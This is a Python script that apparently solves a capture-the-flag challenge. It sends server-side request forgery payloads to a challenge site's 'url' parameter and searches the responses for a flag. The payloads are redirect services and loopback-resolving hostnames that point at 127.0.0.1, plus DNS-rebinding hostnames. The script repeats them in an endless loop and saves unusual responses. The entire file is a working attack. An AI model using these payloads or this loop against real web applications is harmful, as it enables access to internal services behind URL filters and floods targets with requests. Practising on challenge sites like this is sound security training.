import requests
import time
import hashlib

CHALLENGE_URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/"
TARGET_URL_PARAM = "url" 

PAYLOADS = [
    # Redirects
    "https://httpbin.org/redirect-to?url=http://127.0.0.1",
    "https://httpbin.org/redirect-to?url=http://localhost",
    "http://127.0.0.1.nip.io",
    "http://localtest.me",
    
    # DNS Rebinding (User provided)
    "http://08080808.7f000001.rbndr.us",
    "http://08080101.7f000001.rbndr.us"
]

def check(payload):
    try:
        print(f"Testing {payload}...")
        params = {TARGET_URL_PARAM: payload, "submit": "Analizo"}
        r = requests.get(CHALLENGE_URL, params=params, timeout=10)
        
        if "CSC26" in r.text or "flag{" in r.text.lower():
            print(f"[!!!!] FLAG FOUND: {r.text[:200]}...")
            return True
            
        # Check if content length is unusual (assuming 5399 is 'normal')
        if abs(len(r.content) - 5399) > 500:
             print(f"[!] Interesting response (len={len(r.content)}) for {payload}")
             with open(f"suspicious_{int(time.time())}.html", "wb") as f:
                 f.write(r.content)
                 
    except Exception as e:
        print(f"Error: {e}")

print("Genering traffic...")
while True:
    for p in PAYLOADS:
        check(p)
        time.sleep(0.5)
